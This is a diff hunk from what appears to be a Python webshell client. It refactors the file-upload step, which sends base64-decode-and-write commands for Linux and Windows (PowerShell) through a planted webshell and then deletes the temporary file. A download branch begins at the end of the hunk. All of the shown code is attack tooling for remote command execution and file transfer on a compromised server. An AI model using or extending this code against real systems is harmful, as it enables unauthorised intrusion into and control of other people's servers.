@@ -87,8 +87,8 @@ try:
                 if system == "linux":
                    send_command("base64 -di " + remotefiletmp + (' > ') + remotefile + " ; rm -f " + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
                 if system == "windows":
-                   send_command("$base64 = cat -raw " + remotefiletmp + " ; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) > " +
-                   remotefile + " ; rm -force " + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
+                   command = " ; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) > "
+                   send_command("$base64 = cat -raw " + remotefiletmp + command + remotefile + " ; rm -force " + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
              else:
                 if "download" in command.split()[0]: 
                    remotefile = command.split()[1]
